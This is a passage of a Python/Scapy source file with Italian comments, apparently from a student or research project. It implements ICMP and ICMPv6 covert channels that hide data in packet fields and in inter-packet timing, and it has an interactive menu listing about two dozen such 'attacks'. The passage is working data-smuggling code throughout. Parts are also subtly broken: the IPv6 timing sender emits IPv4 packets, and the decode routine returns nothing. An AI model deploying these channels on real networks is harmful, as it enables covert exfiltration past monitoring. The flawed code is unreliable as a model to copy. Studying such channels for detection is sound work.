        if not is_ipaddress(self.ip_dst) or self.ip_dst.version!=6: 
            raise TypeError("ip_dst non valido") 
        if not self.dst_mac: 
            raise ValueError("dst_mac non valido") 
        if not self.interface: 
            raise ValueError("interface non valida")
        if not is_ipaddress(ip_src) or ip_src.version!=6:  
            raise Exception("ip_src non valido",ip_src)   
        src_mac=(
            GET_MAC_ADDRESS(ip_src).mac_address.strip().replace("-",":").lower() or 
            get_if_hwaddr(self.interface) 
        )
        if not src_mac:  
            raise ValueError("src_mac non valido")  
        for index in range(0, len(data), 4): 
            dummy_pkt=(
                IPv6(dst=f"{self.ip_dst.compressed}%{self.interface}",
                     src=ip_src.compressed, 
                     plen=int.from_bytes(data[index:index+2]))  /
                ICMPv6EchoReply(type=128,id=int.from_bytes(data[index+2:index+4]), seq=0)
            )
            pkt=(
                Ether(dst=self.dst_mac, src=src_mac) /
                IPv6(dst=f"{self.ip_dst.compressed}%{self.interface}",
                     src=ip_src.compressed)  /
                ICMPv6DestUnreach(type=self.DESTINATION_UNREACHABLE) /
                dummy_pkt
            ) 
            sendp(pkt, verbose=1,iface=self.interface)  
        
    def send_last(self): 
        ip_src=IP.find_local_IP() 
        if not is_ipaddress(ip_src): 
            raise ValueError("ip_src non valido",ip_src)
        src_mac=(
            GET_MAC_ADDRESS(ip_src).mac_address.strip().replace("-",":").lower() or 
            get_if_hwaddr(self.interface) 
        )
        if not src_mac:  
            raise ValueError("src_mac non valido") 
        dummy_pkt=(
            IPv6(
                dst=f"{self.ip_dst.compressed}%{self.interface}",
                src=ip_src.compressed, 
                plen=0xffff)  /
            ICMPv6EchoReply(
                type=ICMP_TYPE.v6_Echo_Reply.value,
                id=self.stop_integer, seq=self.stop_integer)
        )
        pkt=(
            Ether(dst=self.dst_mac, src=src_mac) /
            IPv6(
                dst=f"{self.ip_dst.compressed}%{self.interface}",
                src=ip_src.compressed)  /
            ICMPv6DestUnreach(type=self.DESTINATION_UNREACHABLE) /
            dummy_pkt
        ) 
        sendp(pkt, verbose=1,iface=self.interface)  

class IPV6_TIMING(_IPx): 
    timeout_callback=None
    timer=None 
    numero_bit=0 
    ECHO_REQ=ICMP_TYPE.v6_Echo_Request.value
    ECHO_REP=ICMP_TYPE.v6_Echo_Reply.value 
    last_packet_time=None 

    def __init__(self, ip_dst:ipaddress.IPv4Address, host_attivi:ipaddress.IPv4Address=None, numero_bit:int=0):
        if not is_integer(numero_bit): 
            raise Exception("Numero di bit non valido")
        super().__init__(ip_dst, host_attivi)
        self.timeout_callback=lambda: self.timeout_timer_callback()
        self.timer=get_timer(None,self.timeout_callback)  
        self.DISTANZA_TEMPI=2 #sec
        self.TEMPI_CODICI=[
            3+index*2*self.DISTANZA_TEMPI for index in range(2**self.numero_bit)
        ] 
        self.TEMPO_BYTE=0*60 #minuti 
    
    def get_callback(self): 
        if self.numero_bit<=0: 
            return None   
        DISTANZA_TEMPI=2 #sec
        dict_tempi={}
        dict_tempi.update( [("TEMPO_"+str(index), 3+index*2*DISTANZA_TEMPI)  for index in range(2**self.numero_bit)])
        dict_bit={ }
        dict_bit.update([ ("TEMPO_"+str(index), index)  for index in range(2**self.numero_bit) ])  

        MINUTE_TIME=0*60+30 #minuti
        MAX_TIME=max([value for _,value in dict_tempi.items()])+5 
    
        def callback(packet): 
            nonlocal MAX_TIME, MINUTE_TIME  
            if self.last_packet_time is None: 
                self.last_packet_time=packet.time 
                self.timer.cancel()
                self.timer=get_timer(MAX_TIME,self.timeout_callback) 
                self.timer.start() 
                return  
            if packet.time is not None: 
                delta_time=packet.time-self.last_packet_time   
                arr=arr=[(key, abs(delta_time-value)) for key,value in dict_tempi.items()] 
                min_value=min([y for _,y in arr]) 
                min_indices = [i for i, v in enumerate(arr) if v[1] == min_value] 
                self.data.append(dict_bit.get(arr[min_indices[0]][0]))
                self.last_packet_time=packet.time
                self.timer.cancel() 
                if len(self.data)%8==0: 
                    self.timer=get_timer(MINUTE_TIME,self.timeout_callback) 
                else:
                    self.timer=get_timer(MAX_TIME,self.timeout_callback) 
                self.timer.start()
        return callback
    
    def wait(self, type_list:list[int]=None):      
        super().wait(type_list) 
    
    def send(self, data:bytes=None, type_attacco:Enum=None, ip_src:ipaddress.IPv4Address=None): 
        def old_send(): 
            bit_data=[] 
            for piece_data in data: #BIG ENDIAN
                bit_data.append([(piece_data >> index) & 1 for index in range(8)]) #LSB
                #bit_data.append([(piece_data >> index) & 1 for index in reversed(range(8))]) #MSB
                bit_piece_data=[(piece_data >> index) & 1 for index in range(8)] 
            for piece_bit_data in bit_data:
                for bit1, bit2,bit3,bit4 in zip(piece_bit_data[0::4], piece_bit_data[1::4],piece_bit_data[2::4], piece_bit_data[3::4]):
                    index=bit1<<3 | bit2<<2 |  bit3<<1 | bit4  
                    time.sleep(self.TEMPI_CODICI[index])  
                    pkt= (
                        Ether(dst=self.dst_mac, src=self.src_mac) /
                        IPv6(dst=f"{self.ip_dst.compressed}%{self.interface}",
                            src=ip_src.compressed) /
                        ICMPv6EchoReply(type=self.ECHO_REP) /
                        Raw()
                    ) 
                    #print(f"Sending {pkt.summary()} through interface {interface}")  
                    sendp(pkt, verbose=1,iface=self.interface)
                time.sleep(self.TEMPO_BYTE)
        if not is_bytes(data): 
            raise TypeError("data non bytes") 
        if not is_ipaddress(self.ip_dst) or self.ip_dst.version!=6: 
            raise TypeError("ip_dst non valido") 
        if not self.dst_mac: 
            raise ValueError("dst_mac non valido") 
        if not self.interface: 
            raise ValueError("interface non valida") 
        if not is_ipaddress(ip_src) or ip_src.version!=6:  
            raise Exception("ip_src non valido",ip_src)   
        src_mac=(
            GET_MAC_ADDRESS(ip_src).mac_address.strip().replace("-",":").lower() or 
            get_if_hwaddr(self.interface) 
        )
        if not src_mac:  
            raise ValueError("src_mac non valido") 
        #Nella comunicazione possono verificarsi turbolenze. 
        #Per poter distinguere i due tempi la distanza deve essere adeguata. 
        #Inoltre il tempo maggiore dovrà distare alemno 2d dal tempo minore 
        pkt= (
            Ether(dst=self.dst_mac, src=src_mac) /
            IPv6(dst=f"{self.ip_dst.compressed}%{self.interface}",
                 src=ip_src.compressed) /
            ICMPv6EchoReply(type=ICMP_TYPE.v6_Echo_Reply.value) /
            Raw()
        ) 
        #pkt.summary()
        #pkt.show()
        sendp(pkt, verbose=1,iface=self.interface) 
        for byte_data in data: 
            mask=(1<<self.numero_bit)-1  
            icmp_type=random.choice([
                ICMP_TYPE.v4_Echo_Reply,
                #ICMP_TYPE.v4_TimeExceeded
            ])
            #print("PIECE DATA:",format(byte_data, "08b")) 
            #print("MASK:",mask) 
            for index in range(0,8,self.numero_bit): 
                #print("INDEX:",index) 
                #print("4bit: ",(byte_data >> index) & mask) 
                #print("---------------") 
                index_time=(byte_data >> index) & mask 
                time.sleep(self.TEMPI_CODICI[index_time])  
                pkt= Ether(dst=self.dst_mac)/\
                    IP(src=ip_src, dst=self.ip_dst.compressed)/\
                    ICMP(type=icmp_type.value, id=125, seq=225)/\
                    Raw()
                #pkt.summary()
                #pkt.show()
                sendp(pkt, verbose=1, iface=self.interface)  
            time.sleep(self.TEMPO_BYTE)

    def send_last(self): 
        pass  

    def wait_ipv6_timing_cc(self, ): 
        str_data=""
        for integer in self.data:
            str_data+=format(integer, f'0{self.numero_bit}b') 
        data="" 
        for index in range(0, len(str_data), 8):
            int_data=0
            for bit in str_data[index:index+8][::-1]:
                int_data=int_data<<1|int(bit)
            data+=chr(int_data) 

class AttackType(Enum): 
    ipv4_destination_unreachable=0
    ipv4_destination_unreachable_unused=1
    ipv4_time_exceeded=2
    ipv4_time_exceeded_unused=3
    ipv4_parameter_problem=4
    ipv4_parameter_problem_unused=5
    ipv4_source_quench=6
    ipv4_source_quench_unused=7
    ipv4_redirect=8
    ipv4_echo_campi=9
    ipv4_echo_payload=10
    ipv4_echo_campi_payload=11
    ipv4_timestamp=12
    ipv4_information=13
    ipv4_timing_channel_8bit=14
    ipv4_timing_channel_8bit_noise=15 
    ipv4_echo_random_payload=16  

    ipv6_echo=20
    ipv6_parameter_problem=21
    ipv6_time_exceeded=22
    ipv6_packet_to_big=23
    ipv6_destination_unreachable=24 
    ipv6_timing_cc=25  

    def choose_attack_function(): 
        attack_enum=None
        while True: 
            print(AttackType.print_available_attack(),"\n")
            msg="Scegli il nome o il codice della funzione:\t" 
            scelta=str(input(msg)).lower().strip() 
            print("Hai scelto: ",scelta if str(scelta)!="" else "<empty>") 
            attack_enum=AttackType.get_attack_method(scelta) 
            if is_enum_member(attack_enum,AttackType): 
                break
            msg="\n\nNessuna funzione trovata. Si vuole continuare? S/N\t" 
            if not ask_bool_choice(msg): 
                break
        return attack_enum 

    def get_attack_method(attack=None)->Enum: 
        #Data in input una qualsiasi variabile ritorna l'enum associato quando possibile
        if is_enum_member(attack, AttackType): 
            return attack  
        elif is_enum_member(attack,Enum): 
            try: 
                return AttackType[attack.name] 
            except KeyError as k: 
                print("STRINGA NON VALIDA",k)
            try: 
                return AttackType(attack.value)
            except ValueError as v: 
                print("INTEGER NON VALIDO",v) 
        elif is_integer(attack): 
            try:
                return AttackType(attack)
            except ValueError as v:
                print("INTEGER NON VALIDO",v)
        elif is_string(attack): 
            try:
                return AttackType(int(attack))
            except ValueError as k: 
                print("STRINGA NON VALIDA",k)
            try:
                return AttackType[attack]
            except KeyError as k: 
                print("STRINGA NON VALIDA",k)
        
        return None
    
    def get_description(attack:Enum=None)->str: 
        if is_enum_member(attack, AttackType): 
            match attack: 
                case AttackType.ipv4_destination_unreachable: 
                    return "Usa i campi di ICMP Destination Unreachable"
                case AttackType.ipv4_destination_unreachable_unused: 
                    return "Usa icampi di ICMP Destination Unreachable. In particolare 'unused'"
                case AttackType.ipv4_time_exceeded: 
                    return "Usa i campi di ICMP Time Exceeded"
                case AttackType.ipv4_time_exceeded_unused: 
                    return "Usa i campi di ICMP Time Exceeded. In particolare 'unused'"
                case AttackType.ipv4_parameter_problem: 
                    return "Usa i campi di ICMP Parameter Problem"
                case AttackType.ipv4_parameter_problem_unused: 
                    return "Usa i campi di ICMP Parameter Problem. In particolare 'unused'"
                case AttackType.ipv4_source_quench: 
                    return "Usa i campi di ICMP Source Quench"
                case AttackType.ipv4_source_quench_unused: 
                    return "Usa i campi di ICMP Source Quench. In particolare 'unused'"
                case AttackType.ipv4_redirect: 
                    return "Usa i campi di ICMP Redirect"
                case AttackType.ipv4_echo_campi: 
                    return "Usa i campi di ICMP Echo. In particolare 'identifier'"
                case AttackType.ipv4_echo_payload: 
                    return "Usa i campi di ICMP Echo. In particolare 'payload'"
                case AttackType.ipv4_echo_random_payload: 
                    return "Usa i campi di ICMP Echo. In particolare 'payload' con dimensione variabile"
                case AttackType.ipv4_echo_campi_payload: 
                    return "Usa i campi di ICMP Echo. In particolare 'idnetifier' e 'payload'"
                case AttackType.ipv4_timestamp: 
                    return "Usa i campi di ICMP Timestamp"
                case AttackType.ipv4_information: 
                    return "Usa i campi di ICMP Information"
                case AttackType.ipv4_timing_channel_8bit: 
                    return "Usa i campi di ICMP per inviare dati tramite il tempo"
                case AttackType.ipv4_timing_channel_8bit_noise: 
                    return "Usa i campi di ICMP per inviare dati tramite il tempo aggiungendo del rumore di sottofondo"
                #------------------------------------------------
                case AttackType.ipv6_echo: 
                    return "Usa i campi di ICMP v6 Echo"
                case AttackType.ipv6_parameter_problem: 
                    return "Usa i campi di ICMP v6 Parameter Problem"
                case AttackType.ipv6_time_exceeded: 
                    return "Usa i campi di ICMP v6 Time Exceeded"
                case AttackType.ipv6_packet_to_big: 
                    return "Usa i campi di ICMP v6 Packet to Big"
                case AttackType.ipv6_destination_unreachable: 
                    return "Usa i campi di ICMP v6 Destination Unreachable"
                case AttackType.ipv6_timing_cc: 
                    return "Usa i campi di ICMP v6 per inviare dati tramite il tempo"
                #------------------------------------------------
        raise Exception("Attacco immesso non valido: ",attack) 
    
    def print_available_attack(): 
        time.sleep(0.5)
        print("Gli attacchi disponibili sono:\n")
        for enumerator in list(AttackType): 
            time.sleep(2) 
            print(f" *{enumerator.name}:{enumerator.value}\n\t{AttackType.get_description(enumerator)}\n") 
        time.sleep(0.5) 
        print("\n Per scegliere un attacco, usa il nome o il numero corrispondente.") 
        time.sleep(1) 
        print(""" 
            \nAd esempio per l'attacco ICMPv4 Destination Unreachable, puoi scegliere: 
            \n\t*Il nome 'ipv4_destination_unreachable' 
            \n\t\toppure'.
            \n\t*Il numero '0'.
        """) 
        


